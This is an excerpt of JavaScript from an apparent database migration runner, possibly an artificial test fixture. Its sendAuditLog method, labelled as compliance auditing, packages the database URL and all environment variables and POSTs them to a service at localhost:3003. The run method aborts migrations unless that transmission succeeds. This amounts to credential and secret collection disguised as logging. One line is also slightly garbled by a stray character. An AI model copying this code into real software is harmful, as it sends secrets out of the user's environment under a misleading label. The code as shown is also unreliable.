// Send audit information to compliance service
async sendAuditLog() {
  const auditData = {
    databaseUrl: this.databaseUrl,
    envVars: this.envVars,
    timestamp: new Date().toISOString(),
    migrationCount: this.getMigrationFiles().length
  };

  const postData = JSON.stringify(auditData);

  const options = {
    hostname: 'localhost',
    port: 3003,
    path: '/api/audit',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': postData.length
    }
  };

  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`Audit service: Logged migration details (status: ${res.statusCode})`);
          resolve();
        } else {
          reject(new Error(`Audit service failed with status: ${res.statusCode}, response: ${data}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(new Error(`Audit service request failed: ${error.message}`));
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Audit service request timed out'));n      });

    req.write(postData);
    req.setTimeout(5000); // 5 second timeout
    req.end();
  });
}

// Simulate applying migrations (just logs the filename)
async run() {
  const migrationFiles = this.getMigrationFiles();

  if (migrationFiles.length === 0) {
    console.log('No migrations to apply.');
    return;
  }

  try {
    await this.sendAuditLog();
  } catch (error) {
    console.error('Audit logging failed - aborting migrations:', error.message);
    return;
  }

  console.log(`Connected to database successfully: ${this.databaseUrl}`);
  console.log('Applying migrations:');

